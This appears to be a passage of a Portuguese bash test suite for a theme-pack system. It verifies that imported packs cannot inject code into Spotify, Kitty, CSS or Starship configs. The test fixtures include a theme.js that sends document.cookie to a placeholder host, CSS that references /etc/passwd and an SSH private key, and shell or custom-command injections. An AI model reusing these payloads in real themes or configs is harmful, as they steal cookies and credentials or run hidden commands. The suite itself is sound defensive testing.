PLINK="$RAIZ_DELA/mal-fotos-link"; mkdir -p "$PLINK"
cp "$RAIZ/packs/dracula/paleta.json" "$PLINK/"
sed -e 's/"mal-fotos"/"mal-fotos-link"/' -e 's/, "fotos": "[^"]*"//' "$PFOTO/pack.json" > "$PLINK/pack.json"
ln -s "$FOTOS_FORA" "$PLINK/wallpapers"
saida="$(amb python3 "$RAIZ/scripts/pack.py" wallpapers mal-fotos-link 2>&1)"
grep -q '^fotos=' <<< "$saida" \
  && falha "a pasta wallpapers que é link virou fotos do pack" "$saida" \
  || ok "a pasta wallpapers que é link para fora não vira fotos do pack"
cat > "$T/py-mal/python3" <<PYF
#!/bin/sh
if [ "\$2" = wallpapers ]; then printf 'prefixo=malf\nfotos=%s\n' "$FOTOS_FORA"; exit 0; fi
exec "$PY_REAL" "\$@"
PYF
chmod 755 "$T/py-mal/python3"
for p in mal-fotos mal-fotos-link dracula; do
  caminho="$T/falso:$PATH"; [ "$p" = dracula ] && caminho="$T/py-mal:$T/falso:$PATH"
  amb PATH="$T/curl:$caminho" PACK="$p" WALLPAPER_BASE="$T/papel-fotos-$p" \
    bash "$RAIZ/scripts/wallpaper.sh" semear > "$T/papel-fotos-$p.log" 2>&1
done
achadas="$(find "$T"/papel-fotos-* -name 'foto-de-fora*' 2>/dev/null)"
[ -z "$achadas" ] && ok "nenhuma foto de fora do pack entrou no acervo (declarada, link, ou plantada no pack.py)" \
  || falha "uma foto de fora do pack foi semeada" "$achadas"
for _caso in ponto:.. barra:a/b; do
  _id="mal-spot-${_caso%%:*}"; _nome="${_caso#*:}"
  mkdir -p "$RAIZ_DELA/$_id/temas-de-apps/spotify/x" "$RAIZ_DELA/$_id-filho"
  cp "$RAIZ/packs/dracula/paleta.json" "$RAIZ_DELA/$_id/"
  cp "$RAIZ/packs/dracula/paleta.json" "$RAIZ_DELA/$_id-filho/"
  printf '[Dracula]\ntext = ffffff\n' > "$RAIZ_DELA/$_id/temas-de-apps/spotify/x/color.ini"
  printf '{"formato": 1, "id": "%s", "nome": "Mal spot", "versao": "1.0.0", "autor": "x", "licenca": "MIT",\n "heranca": "dracula", "paleta": {"arquivo": "paleta.json", "flavor_padrao": "dracula"},\n "apps": {"spotify": {"spicetify_tema": "%s", "esquema": "Dracula", "arquivo": "temas-de-apps/spotify/x/color.ini"}}}\n' \
    "$_id" "$_nome" > "$RAIZ_DELA/$_id/pack.json"
  printf '{"formato": 1, "id": "%s-filho", "nome": "Mal spot filho", "versao": "1.0.0", "autor": "x", "licenca": "MIT",\n "heranca": "%s", "paleta": {"arquivo": "paleta.json", "flavor_padrao": "dracula"}}\n' \
    "$_id" "$_id" > "$RAIZ_DELA/$_id-filho/pack.json"
  saida="$(amb python3 "$RAIZ/scripts/pack.py" validar "$_id" 2>&1)"; rc=$?
  [ "$rc" != 0 ] && grep -q 'spicetify_tema' <<< "$saida" \
    && ok "o validar recusa o nome de tema do Spotify '$_nome'" \
    || falha "o validar aceitou '$_nome' como nome de tema do Spotify (rc=$rc)" "$saida"
  [ -z "$(adotado "$_id-filho")" ] \
    || falha "o filho de $_id não validou; a sonda do módulo não prova nada"
  SPI="$CASA/.config/spicetify"
  rm -rf "$SPI"; mkdir -p "$SPI/Themes/a/b" "$SPI/Themes/Outro"
  printf 'current_theme = Outro\n' > "$SPI/config-xpui.ini"
  printf 'dela\n' > "$SPI/Themes/a/b/guardado"
  printf '[x]\n' > "$SPI/Themes/Outro/color.ini"
  saida="$(amb PACK="$_id-filho" FLAVOR=dracula bash -c '. "$MEOW_RAIZ/scripts/lib/comum.sh" || exit 2
    . "$MEOW_RAIZ/scripts/temas-de-apps/spotify/manifesto.sh" || exit 2
    _spot_tema_baixar; printf "baixar=%s\n" "$?"; meow_app_detectar; printf "detectar=%s\n" "$?"' 2>&1)"
  if [ -f "$SPI/config-xpui.ini" ] && [ -f "$SPI/Themes/a/b/guardado" ] && [ -f "$SPI/Themes/Outro/color.ini" ] \
     && [ ! -e "$SPI/color.ini" ] && [ ! -e "$SPI/Themes/a/b/color.ini" ] \
     && grep -qx 'baixar=3' <<< "$saida" && grep -qx 'detectar=3' <<< "$saida"; then
    ok "o Spotify recusa o nome de tema '$_nome' que vem pela herança: nada apagado, nada escrito"
  else
    falha "o nome de tema '$_nome' do Spotify apagou ou escreveu fora de Themes/<nome>" \
      "$(find "$SPI" | sed "s|$T|T|"; printf '%s\n' "$saida" | tail -4)"
  fi
done
_id=mal-spot-js
mkdir -p "$RAIZ_DELA/$_id/temas-de-apps/spotify/Js"
cp "$RAIZ/packs/dracula/paleta.json" "$RAIZ_DELA/$_id/"
printf '[Dracula]\ntext = ffffff\n' > "$RAIZ_DELA/$_id/temas-de-apps/spotify/Js/color.ini"
printf 'fetch("https://exemplo.invalid/?" + document.cookie)\n' > "$RAIZ_DELA/$_id/temas-de-apps/spotify/Js/theme.js"
mkdir -p "$RAIZ_DELA/$_id/temas-de-apps/spotify/Js/assets"
printf 'fetch("https://exemplo.invalid/a")\n' > "$RAIZ_DELA/$_id/temas-de-apps/spotify/Js/assets/x.js"
printf 'fetch("https://exemplo.invalid/b")\n' > "$RAIZ_DELA/$_id/temas-de-apps/spotify/Js/extra.js"
printf '<script>fetch("https://exemplo.invalid/c")</script>\n' > "$RAIZ_DELA/$_id/temas-de-apps/spotify/Js/pagina.html"
printf ':root { --x: 1; }\n' > "$RAIZ_DELA/$_id/temas-de-apps/spotify/Js/user.css"
printf '#!/bin/sh\nprintf "%%s\\n" "$*" >> "$HOME/portas.log"\n' > "$T/falso-spicetify"; chmod +x "$T/falso-spicetify"
printf '{"formato": 1, "id": "%s", "nome": "Mal js", "versao": "1.0.0", "autor": "x", "licenca": "MIT",\n "heranca": "dracula", "paleta": {"arquivo": "paleta.json", "flavor_padrao": "dracula"},\n "apps": {"spotify": {"spicetify_tema": "Js", "esquema": "Dracula", "arquivo": "temas-de-apps/spotify/Js/color.ini"}}}\n' \
  "$_id" > "$RAIZ_DELA/$_id/pack.json"
js_do_spotify() {
  rm -rf "$CASA/.config/spicetify"; mkdir -p "$CASA/.config/spicetify"
  amb PACK="$1" FLAVOR="$2" bash -c '. "$MEOW_RAIZ/scripts/lib/comum.sh" || exit 2
    . "$MEOW_RAIZ/scripts/temas-de-apps/spotify/manifesto.sh" || exit 2
    _spot_tema_baixar >/dev/null 2>&1
    rm -f "$HOME/portas.log"; _spot_portas "$0"
    printf "injeta=%s copiou=%s executavel=%s portas=%s\n" "$(_spot_injetar_js)" "$(ls "$_SPOT_TEMA/theme.js" 2>/dev/null | wc -l)" \
      "$(find "$_SPOT_TEMA" -type f \( -name "*.js" -o -name "*.mjs" -o -name "*.html" \) | wc -l)" \
      "$(grep -o "inject_theme_js [01] replace_colors 1 overwrite_assets [01]" "$HOME/portas.log" | tr " " _)"' "$T/falso-spicetify" 2>&1 | tail -1
}
importado="$(js_do_spotify "$_id" dracula)"; repositorio="$(js_do_spotify meowsystem mocha)"
js_do_spotify "$_id" dracula >/dev/null; tema_importado="$(cd "$CASA/.config/spicetify/Themes/Js" 2>/dev/null && find . -type f | LC_ALL=C sort | tr '\n' ' ')"
if [ "$importado" = "injeta=0 copiou=0 executavel=0 portas=inject_theme_js_0_replace_colors_1_overwrite_assets_0" ] \
   && [ "$tema_importado" = "./PROCEDENCIA.txt ./color.ini ./user.css " ] \
   && [ "${repositorio%% executavel=*}" = "injeta=1 copiou=1" ] \
   && [ "${repositorio##* portas=}" = "inject_theme_js_1_replace_colors_1_overwrite_assets_1" ]; then
  ok "nenhum executável de pack importado chega ao Spotify: do tema dele só entram color.ini e user.css, e o theme.js e os assets ficam com a porta fechada; o do repositório segue com as duas abertas"
else
  falha "um executável de pack importado chegou ao Spotify, ou o do repositório perdeu a porta" \
    "importado: $importado ($tema_importado) / repositório: $repositorio"
fi
mkdir -p "$RAIZ_DELA/pai-falso/temas-de-apps/spotify/Js/assets" "$RAIZ_DELA/filho-do-falso"
cp "$RAIZ/packs/dracula/paleta.json" "$RAIZ_DELA/pai-falso/"; cp "$RAIZ/packs/dracula/paleta.json" "$RAIZ_DELA/filho-do-falso/"
cp "$RAIZ_DELA/mal-spot-js/temas-de-apps/spotify/Js/"{color.ini,theme.js,user.css} "$RAIZ_DELA/pai-falso/temas-de-apps/spotify/Js/"
cp "$RAIZ_DELA/mal-spot-js/temas-de-apps/spotify/Js/assets/x.js" "$RAIZ_DELA/pai-falso/temas-de-apps/spotify/Js/assets/"
printf '{"formato": 2, "id": "meowsystem", "nome": "Pai", "heranca": "dracula", "paleta": {"arquivo": "paleta.json", "flavor_padrao": "dracula"},\n "apps": {"spotify": {"spicetify_tema": "Js", "esquema": "Dracula", "arquivo": "temas-de-apps/spotify/Js/color.ini"}}}\n' \
  > "$RAIZ_DELA/pai-falso/pack.json"
printf '{"formato": 2, "id": "filho-do-falso", "nome": "Filho", "heranca": "pai-falso", "vitrine": {"capa": "logo.svg"}, "paleta": {"arquivo": "paleta.json", "flavor_padrao": "dracula"}}\n' \
  > "$RAIZ_DELA/filho-do-falso/pack.json"
cp "$RAIZ/packs/dracula/logo.svg" "$RAIZ_DELA/filho-do-falso/"
falso_valida="$(amb python3 "$RAIZ/scripts/pack.py" validar filho-do-falso 2>&1)"; rc_falso=$?
pelo_id="$(js_do_spotify filho-do-falso dracula)"
js_do_spotify filho-do-falso dracula >/dev/null; tema_falso="$(cd "$CASA/.config/spicetify/Themes/Js" 2>/dev/null && find . -type f | LC_ALL=C sort | tr '\n' ' ')"
if [ "$rc_falso" = 0 ] && [ "$pelo_id" = "injeta=0 copiou=0 executavel=0 portas=inject_theme_js_0_replace_colors_1_overwrite_assets_0" ] \
   && [ "$tema_falso" = "./PROCEDENCIA.txt ./color.ini ./user.css " ]; then
  ok "um pai de fora que se diz «meowsystem» no pack.json não abre a porta do Spotify: a porta olha o caminho do tema, não o nome que o pack dá a si"
else
  falha "um pai de fora com o id de um pack do repositório abriu a porta do Spotify (validar rc=$rc_falso)" "$pelo_id ($tema_falso) / $falso_valida"
fi
rm -rf "$RAIZ_DELA/pai-falso" "$RAIZ_DELA/filho-do-falso"
mkdir -p "$RAIZ_DELA/meowsystem/prompt"; cp "$RAIZ/packs/meowsystem/paleta.json" "$RAIZ_DELA/meowsystem/"
printf '{"formato": 2, "id": "meowsystem", "nome": "Sombra", "paleta": {"arquivo": "paleta.json", "flavor_padrao": "mocha"}, "prompt": {"starship": "prompt/starship.toml"}}\n' \
  > "$RAIZ_DELA/meowsystem/pack.json"
printf 'format = "$custom"\n[custom.x]\ncommand = "touch %s"\nwhen = "true"\n' "$MARCA" > "$RAIZ_DELA/meowsystem/prompt/starship.toml"
sombra_base="$(amb python3 "$RAIZ/scripts/pack.py" prompt meowsystem 2>&1)"
sombra_dracula="$(amb python3 "$RAIZ/scripts/pack.py" prompt dracula 2>&1)"
if grep -qxF "valor=$RAIZ/packs/meowsystem/prompt/starship.toml" <<< "$sombra_base" \
   && grep -qxF "valor=$RAIZ/packs/meowsystem/prompt/starship.toml" <<< "$sombra_dracula" && grep -qx 'recusado=meowsystem' <<< "$sombra_dracula"; then
  ok "um pack pessoal com o id do pack-base esconde o do repositório na herança, mas o prompt que vale é o starship.toml do repositório"
else
  falha "o pack pessoal com o id do pack-base entregou o starship.toml dele" "meowsystem: $sombra_base / dracula: $sombra_dracula"
fi
rm -rf "$RAIZ_DELA/meowsystem"
_id=mal-molde
mkdir -p "$RAIZ_DELA/$_id/temas-de-apps/kitty" "$RAIZ_DELA/$_id/temas-de-apps/zapzap" "$RAIZ_DELA/$_id/meus" "$RAIZ_DELA/$_id/temas-de-apps/libadwaita/ajustes" \
  "$RAIZ_DELA/$_id/temas/capturados/original/com.system76.CosmicTheme.Mode/v1"
cp "$RAIZ/packs/dracula/paleta.json" "$RAIZ_DELA/$_id/"
printf '# meowsystem-tema: {{pack}}/{{flavor}}\nforeground {{text}}\nshell sh -c "touch %s"\ngeninclude %s\n' "$MARCA" "$MARCA" > "$RAIZ_DELA/$_id/temas-de-apps/kitty/kitty.modelo.conf"
printf '/* meowsystem-tema: {{pack}}/{{flavor}} */\n@import url("https://exemplo.invalid/x.css");\nbody { color: {{text}}; }\n' > "$RAIZ_DELA/$_id/temas-de-apps/zapzap/zapzap.modelo.css"
printf '@import url("file:///etc/passwd");\n' > "$RAIZ_DELA/$_id/meus/discord.css"
cp "$RAIZ/packs/meowsystem/temas-de-apps/libadwaita/libadwaita.modelo.css" "$RAIZ_DELA/$_id/temas-de-apps/libadwaita/"
printf '@import url("https://exemplo.invalid/y.css");\n' > "$RAIZ_DELA/$_id/temas-de-apps/libadwaita/ajustes/com.github.rafostar.Clapper.modelo.css"
printf 'true\n' > "$RAIZ_DELA/$_id/temas/capturados/original/com.system76.CosmicTheme.Mode/v1/is_dark"
printf '{"formato": 2, "id": "%s", "nome": "Mal molde", "heranca": "dracula", "vitrine": {"capa": "logo.svg"}, "paleta": {"arquivo": "paleta.json", "flavor_padrao": "dracula"},\n "apps": {"discord": {"arquivo": "meus/discord.css"}}}\n' "$_id" > "$RAIZ_DELA/$_id/pack.json"
cp "$RAIZ/packs/dracula/logo.svg" "$RAIZ_DELA/$_id/"
molde_ruim=""
for _app in kitty zapzap discord libadwaita; do
  _achado="$(amb FLAVOR=dracula python3 "$RAIZ/scripts/pack.py" app "$_id" "apps.$_app.arquivo" 2>&1)"
  _base="$(cd "$RAIZ/packs/meowsystem/temas-de-apps/$_app" && ls "$_app".modelo.* | head -n 1)"
  [ "$(sed -n 's/^valor=//p' <<< "$_achado")" = "$RAIZ/packs/meowsystem/temas-de-apps/$_app/$_base" ] && grep -qx "pack=$_id" <<< "$_achado" || molde_ruim+=" $_app($_achado)"
done
molde_aviso="$(amb python3 "$RAIZ/scripts/pack.py" validar "$_id" 2>&1)"; rc_molde=$?
if [ -z "$molde_ruim" ] && [ "$rc_molde" = 0 ] && [ "$(grep -c 'aviso apps\.\(kitty\|zapzap\|discord\):' <<< "$molde_aviso")" = 3 ] \
   && ! grep -q 'aviso apps.libadwaita:' <<< "$molde_aviso" && [ ! -e "$MARCA" ]; then
  ok "molde de tema de pack de fora que difere do pack-base não é lido (o kitty com shell e geninclude, o CSS com @import, o arquivo declarado à mão): vale o do pack-base, com os ajustes dele, e o validar avisa"
else
  falha "um molde de pack de fora foi lido, ou o validar não avisou (validar rc=$rc_molde)" "moldes:$molde_ruim / $molde_aviso"
fi
original="$(amb MEOW_PACK_DIR="$RAIZ_DELA/$_id" python3 "$RAIZ/scripts/pack.py" captura original 2>&1)"
[ "$original" = "$RAIZ/packs/meowsystem/temas/capturados/original" ] \
  && ok "a captura original é sempre a do pack-base do repositório, mesmo com um pack de fora que traz uma com esse nome" \
  || falha "a captura original veio do pack de fora" "$original"
_id=mal-sem-base
mkdir -p "$RAIZ_DELA/$_id/meus" "$RAIZ_DELA/$_id/temas-de-apps/inventado"
cp "$RAIZ/packs/dracula/paleta.json" "$RAIZ/packs/dracula/logo.svg" "$RAIZ_DELA/$_id/"
printf 'x { background: url("file://%s"); }\n' "$CASA/.ssh/id_ed25519" > "$RAIZ_DELA/$_id/meus/chromium.css"
printf '@import url("https://exemplo.invalid/z.css");\n' > "$RAIZ_DELA/$_id/temas-de-apps/inventado/inventado.modelo.css"
printf '{"formato": 2, "id": "%s", "nome": "Sem base", "heranca": "dracula", "vitrine": {"capa": "logo.svg"}, "paleta": {"arquivo": "paleta.json", "flavor_padrao": "dracula"},\n "apps": {"chromium": {"arquivo": "meus/chromium.css"}, "outro-inventado": {"arquivo": "meus/chromium.css"}}}\n' "$_id" > "$RAIZ_DELA/$_id/pack.json"
sem_base_ruim=""
for _app in chromium inventado outro-inventado; do
  _achado="$(amb FLAVOR=dracula python3 "$RAIZ/scripts/pack.py" app "$_id" "apps.$_app.arquivo" 2>&1)"; _rc=$?
  { [ "$_rc" != 0 ] && ! grep -q '^valor=' <<< "$_achado" && grep -q "aviso apps.$_app.arquivo:" <<< "$_achado"; } || sem_base_ruim+=" $_app(rc=$_rc: $_achado)"
done
sem_base_aviso="$(amb python3 "$RAIZ/scripts/pack.py" validar "$_id" 2>&1)"; rc_sem_base=$?
if [ -z "$sem_base_ruim" ] && [ "$rc_sem_base" = 0 ] \
   && [ "$(grep -c 'aviso apps\.\(chromium\|inventado\|outro-inventado\): o pack-base não tem molde' <<< "$sem_base_aviso")" = 3 ]; then
  ok "molde de pack de fora para aplicativo que o pack-base não tem não é lido (um real sem molde, um inventado, um declarado): o pack.py não entrega o arquivo, avisa, e o validar avisa de cada um"
else
  falha "o molde de pack de fora sem equivalente no pack-base foi entregue, ou o validar não avisou (validar rc=$rc_sem_base)" "$sem_base_ruim / $sem_base_aviso"
fi
MARCA_PROMPT="$T/prompt-executou"
mkdir -p "$T/st-bin"
printf '#!/bin/sh\nexit 0\n' > "$T/st-bin/starship"; chmod +x "$T/st-bin/starship"
pack_de_prompt() {
  mkdir -p "$RAIZ_DELA/$1/prompt"; cp "$RAIZ/packs/dracula/paleta.json" "$RAIZ_DELA/$1/"
  if [ -n "$2" ]; then
    printf '{"formato": 2, "id": "%s", "nome": "Prompt", "heranca": "dracula", "paleta": {"arquivo": "paleta.json", "flavor_padrao": "dracula"}, "prompt": {"starship": "prompt/starship.toml"}}\n' "$1" > "$RAIZ_DELA/$1/pack.json"
    printf '%s' "$2" > "$RAIZ_DELA/$1/prompt/starship.toml"
  else
    printf '{"formato": 2, "id": "%s", "nome": "Prompt", "heranca": "dracula", "paleta": {"arquivo": "paleta.json", "flavor_padrao": "dracula"}}\n' "$1" > "$RAIZ_DELA/$1/pack.json"
  fi
}
prompt_de() {
  amb PATH="$T/st-bin:$T/falso:$PATH" MEOW_CONF="$T/conf-prompt" PACK="$1" FLAVOR=dracula MEOW_ESTADO="$T/estado-prompt" \
    PROMPT_STARSHIP=sim PROMPT_ALVO="$T/st-$1.toml" bash "$RAIZ/scripts/prompt.sh" aplicar > "$T/prompt-$1.log" 2>&1
  local st_real; st_real="$(command -v starship 2>/dev/null)"
  if [ -n "$st_real" ] && [ -f "$T/st-$1.toml" ]; then
    ( cd "$T" && env -i PATH="$T/falso:/usr/bin:/bin" HOME="$CASA" STARSHIP_CONFIG="$T/st-$1.toml" \
        STARSHIP_CACHE="$T/st-cache" "$st_real" prompt >/dev/null 2>&1 )
  fi
}
pack_de_prompt so-paleta ""
pack_de_prompt mal-prompt "$(printf 'format = "$custom$character"\n\n[custom.x]\ncommand = "touch %s"\nwhen = "true"\nformat = "$output"\n' "$MARCA_PROMPT")"
pack_de_prompt mal-prompt-linhas "$(printf "format = \"\$custom\$character\"\npalette = 'x\n[custom.y]\ncommand = \"touch %s\"\nwhen = \"true\"\nformat = \"\$output\"\n'\n" "$MARCA_PROMPT")"
saida="$(amb python3 "$RAIZ/scripts/pack.py" validar mal-prompt 2>&1)"; rc=$?
prompt_ruim=""; st_real="$(command -v starship 2>/dev/null)"
for _id in so-paleta mal-prompt mal-prompt-linhas; do prompt_de "$_id"; done
for _id in mal-prompt mal-prompt-linhas; do
  esperado="$(sed "s/so_paleta_dracula/$(printf '%s' "$_id" | tr - _)_dracula/g" "$T/st-so-paleta.toml" 2>/dev/null)"
  [ -s "$T/st-$_id.toml" ] && [ "$(cat "$T/st-$_id.toml")" = "$esperado" ] || prompt_ruim+=" $_id"
done
if grep -q 'aviso prompt.starship' <<< "$saida" && ! grep -q 'recusado: prompt' <<< "$saida" && ! grep -qiE 'digite|rode|execute' <<< "$saida" \
   && [ -s "$T/st-so-paleta.toml" ] && [ -z "$prompt_ruim" ] && [ ! -e "$MARCA_PROMPT" ]; then
  ok "o starship.toml de pack de fora que roda comando é recusado inteiro: com [custom] ou com o truque de várias linhas na palette, o prompt é byte a byte o do pack-base com a paleta do pack, e a marca não nasce${st_real:+ (o starship de verdade desenhou o prompt)}"
else
  falha "o starship.toml de pack de fora com [custom] foi aceito (validar rc=$rc; prompt diferente do pack-base em:$prompt_ruim)" \
    "$saida / marca: $(ls "$MARCA_PROMPT" 2>&1) / $(diff "$T/st-so-paleta.toml" "$T/st-mal-prompt.toml" 2>&1 | head -6)"
fi

MARCA_DO_PROMPT_A="$T/prompt-aceito-executou"
prompt_resposta() { amb python3 "$RAIZ/scripts/pack.py" prompt "$1" 2>&1; }
gerado_de() { sed -n 's/^valor=//p' <<< "$1"; }
pack_de_prompt bom-aparencia "$(cat <<'TOML'
"$schema" = 'https://starship.rs/config-schema.json'
format = "$os$username$directory$git_branch$time$line_break$character"
palette = 'catppuccin_mocha'

[os]
disabled = false
style = "bg:mauve fg:crust"

[os.symbols]
Pop = "NEKO"
Linux = "tux"

[username]
show_always = true
style_user = "bg:mauve fg:crust"
format = '[ $user]($style)'

[directory]
truncation_length = 3
truncation_symbol = "…/"

[directory.substitutions]
"Documents" = "docs"
"Downloads" = "baixados"

[git_branch]
format = '[[ $symbol $branch ](fg:crust bg:yellow)]($style)'

[time]
disabled = false
time_format = "%R"

[character]
success_symbol = "[>](bold fg:green)"
error_symbol = "[>](bold fg:red)"

[palettes.catppuccin_mocha]
mauve = "#cba6f7"
crust = "#11111b"
TOML
)"
bom_resp="$(prompt_resposta bom-aparencia)"; bom_arq="$(gerado_de "$bom_resp")"
prompt_de bom-aparencia
bom_ruim=""
{ [ -n "$bom_arq" ] && [ -f "$bom_arq" ] && [ "$bom_arq" != "$RAIZ/packs/meowsystem/prompt/starship.toml" ]; } || bom_ruim+=" valor($bom_resp)"
! grep -q '^recusado=' <<< "$bom_resp" || bom_ruim+=" recusado"
estrutura="$(python3 -I - "$bom_arq" "$T/st-bom-aparencia.toml" <<'PY'
import sys, tomllib
for arq in sys.argv[1:]:
    try:
        d = tomllib.load(open(arq, "rb"))
    except (OSError, tomllib.TOMLDecodeError) as e:
        print(f"{arq}: {e}"); sys.exit()
    ok = (d["os"]["symbols"]["Pop"] == "NEKO" and d["directory"]["truncation_length"] == 3
          and d["directory"]["substitutions"]["Downloads"] == "baixados"
          and d["character"]["success_symbol"] == "[>](bold fg:green)"
          and d["format"] == "$os$username$directory$git_branch$time$line_break$character"
          and set(d) <= {"$schema", "format", "palette", "palettes", "os", "username", "directory", "git_branch", "time", "character"})
    if not ok:
        print(f"{arq}: o que o pack pediu não chegou, ou chegou chave a mais: {sorted(d)}"); sys.exit()
print("ok")
PY
)"
[ "$estrutura" = "ok" ] || bom_ruim+=" estrutura($estrutura)"
grep -q "^palette = 'bom_aparencia_dracula'$" "$T/st-bom-aparencia.toml" 2>/dev/null || bom_ruim+=" paleta-do-pack-no-ar"
grep -q '^mauve = "#bd93f9"$' "$T/st-bom-aparencia.toml" 2>/dev/null || bom_ruim+=" cor-do-dracula"
if [ -n "$st_real" ] && [ -f "$T/st-bom-aparencia.toml" ]; then
  ( cd "$T" && env -i PATH="$T/falso:/usr/bin:/bin" HOME="$CASA" STARSHIP_CONFIG="$T/st-bom-aparencia.toml" \
      STARSHIP_CACHE="$T/st-cache" "$st_real" print-config >/dev/null 2>"$T/st-bom-erro" ) || bom_ruim+=" starship($(head -c 200 "$T/st-bom-erro"))"
fi
if [ -z "$bom_ruim" ]; then
  ok "o prompt de pack pessoal só de aparência entra: o motor escreve o arquivo a partir do que aprovou, o pedido chega (símbolo, estilo, substituições, ordem), a cor é a do pack no ar${st_real:+, e o starship de verdade o carrega}"
else
  falha "o prompt de pack pessoal só de aparência não entrou como pedido:$bom_ruim" "$bom_resp"
fi

recusa_de_prompt() {
  local id="$1" frase="$2" conteudo="$3" resp ruim="" esperado
  rm -rf "$CASA/.cache/meowsystem"
  pack_de_prompt "$id" "$conteudo"
  resp="$(prompt_resposta "$id")"
  grep -qx "recusado=$id" <<< "$resp" || ruim+=" sem-recusado"
  grep -qxF "valor=$RAIZ/packs/meowsystem/prompt/starship.toml" <<< "$resp" || ruim+=" valor-nao-e-o-do-pack-base"
  grep -q "^motivo=.*$frase" <<< "$resp" || ruim+=" motivo-sem($frase: $(sed -n 's/^motivo=//p' <<< "$resp" | head -c 200))"
  [ -z "$(find "$CASA/.cache/meowsystem" -type f 2>/dev/null)" ] || ruim+=" gerou-arquivo"
  prompt_de "$id"
  esperado="$(sed "s/so_paleta_dracula/$(printf '%s' "$id" | tr - _)_dracula/g" "$T/st-so-paleta.toml" 2>/dev/null)"
  [ -s "$T/st-$id.toml" ] && [ "$(cat "$T/st-$id.toml")" = "$esperado" ] || ruim+=" prompt-diferente-do-pack-base"
  ! grep -qE '\[custom|touch |^command|NEKO' "$T/st-$id.toml" 2>/dev/null || ruim+=" arquivo-escrito-tem-o-recusado"
  if [ -z "$ruim" ]; then printf 'ok\n'; else printf '%s\n' "$ruim"; fi
}

recusas_ruins=""
caso() {
  local resultado
  resultado="$(recusa_de_prompt "$@")"
  [ "$resultado" = "ok" ] || recusas_ruins+="
$1:$resultado"
}
caso r-custom custom "$(printf 'format = "$custom$character"\n[custom.x]\ncommand = "touch %s"\nwhen = "true"\n' "$MARCA_DO_PROMPT_A")"
caso r-custom-vazio custom "$(printf '[custom.x]\n')"
caso r-command 'command' "$(printf '[git_branch]\ncommand = "touch %s"\n' "$MARCA_DO_PROMPT_A")"
caso r-commands 'commands' "$(printf '[directory]\ncommands = [["touch", "%s"]]\n' "$MARCA_DO_PROMPT_A")"
caso r-when 'when' "$(printf '[git_branch]\nwhen = "true"\n')"
caso r-shell 'shell' "$(printf '[directory]\nshell = ["sh", "-c"]\n')"
caso r-env-var-chave 'env_var' "$(printf '[directory]\nenv_var = "HOME"\n')"
caso r-env-var-tabela 'env_var' "$(printf '[env_var.HOME]\nvariable = "HOME"\n')"
caso r-desconhecida 'directory.foo' "$(printf '[directory]\nfoo = 1\n')"
caso r-modulo-inventado 'inventado' "$(printf '[inventado]\nformat = "x"\n')"
caso r-notificacao 'cmd_duration.show_notifications' "$(printf '[cmd_duration]\nshow_notifications = true\n')"
caso r-chave-do-topo 'command_timeout' "$(printf 'command_timeout = 100\n')"
caso r-tipo-inteiro 'directory.truncation_length' "$(printf '[directory]\ntruncation_length = "3"\n')"
caso r-tipo-booleano 'os.disabled' "$(printf '[os]\ndisabled = "sim"\n')"
caso r-tipo-lista 'directory.truncation_length' "$(printf '[directory]\ntruncation_length = [1, 2]\n')"
caso r-tipo-texto 'os.symbols.Pop' "$(printf '[os.symbols]\nPop = 7\n')"
caso r-quebra-de-linha 'quebra de linha' "$(printf '[os.symbols]\nPop = "a\\nNEKO"\n')"
caso r-aspas-e-tabela 'quebra de linha' "$(printf '[os.symbols]\nPop = "x\\"\\n[custom.y]\\ncommand = \\"touch %s\\""\n' "$MARCA_DO_PROMPT_A")"
caso r-controle 'controle' "$(printf '[os.symbols]\nPop = "\\u001b[2JNEKO"\n')"
caso r-toml-quebrado 'TOML' "$(printf "format = \"\$custom\$character\"\npalette = 'x\n[custom.y]\ncommand = \"touch %s\"\nwhen = \"true\"\n'\n" "$MARCA_DO_PROMPT_A")"
caso r-palette-multilinha 'palette' "$(printf "palette = '''x\n[custom.y]\ncommand = \"touch %s\"\n'''\n" "$MARCA_DO_PROMPT_A")"
caso r-texto-enorme 'format' "$(python3 -c 'print("format = \"" + "a" * 5000 + "\"")')"
caso r-fmt-env-var 'env_var' "$(printf 'format = "$directory$env_var$character"\n')"
caso r-fmt-env-var-chaves 'env_var' "$(printf 'format = "${env_var.HOME}"\n')"
caso r-fmt-custom 'custom' "$(printf 'format = "$custom$character"\n')"
caso r-fmt-custom-chaves 'custom' "$(printf 'format = "${custom.x}"\n')"
caso r-fmt-direita 'custom' "$(printf 'right_format = "${custom.x}"\n')"
caso r-fmt-continuacao 'env_var' "$(printf 'continuation_prompt = "${env_var.HOME} "\n')"
caso r-fmt-modulo 'format' "$(printf '[git_branch]\nformat = "[${env_var.HOME}](bold)"\n')"
caso r-fmt-modulo-inventado 'inventado' "$(printf 'format = "$directory$inventado"\n')"
caso r-fmt-modulo-nome-dentro 'env_var' "$(printf 'format = "x${env_var}y"\n')"
caso r-liga-sudo 'sudo.disabled' "$(printf '[sudo]\ndisabled = false\n')"
caso r-liga-direnv 'direnv.disabled' "$(printf '[direnv]\ndisabled = false\n')"
caso r-liga-mise 'mise.disabled' "$(printf '[mise]\ndisabled = false\n')"
caso r-liga-localip 'localip.disabled' "$(printf '[localip]\ndisabled = false\n')"
if [ -z "$recusas_ruins" ] && [ ! -e "$MARCA_DO_PROMPT_A" ] && [ ! -e "$MARCA_PROMPT" ]; then
  ok "o prompt de pack pessoal com chave fora da lista é recusado inteiro, com a chave na frase: [custom] (cheio e vazio), command, commands, when, shell, env_var (chave e tabela), chave e módulo desconhecidos, notificação, tipo errado (inteiro, booleano, lista, texto), quebra de linha, caractere de controle, TOML quebrado, palette em várias linhas e texto enorme, referência a env_var, custom ou módulo desconhecido no texto de formato, e ligar sudo, direnv, mise ou localip; nada é gerado, o prompt escrito é o do pack-base, e a marca não nasce"
else
  falha "o prompt de pack pessoal foi aceito, ou a recusa não disse a chave, ou algo foi gerado:" "$recusas_ruins"
fi

rm -rf "$CASA/.cache/meowsystem"
pack_de_prompt liga-e-desliga "$(cat <<'TOML'
format = "$all$directory$character"

[sudo]
disabled = true

[localip]
disabled = true

[time]
disabled = false

[git_branch]
format = '[[ $symbol $branch ](fg:crust bg:yellow)]($style)'
TOML
)"
resp="$(prompt_resposta liga-e-desliga)"
{ ! grep -q '^recusado=' <<< "$resp" && [ -n "$(gerado_de "$resp")" ]; } \
  && ok "desligar módulo que roda coisa, ligar os do preset, \$all e as variáveis do módulo (\$symbol, \$branch) passam" \
  || falha "o prompt que só desliga sudo e localip, e usa \$all, foi recusado" "$resp"

limpo_ruim=""
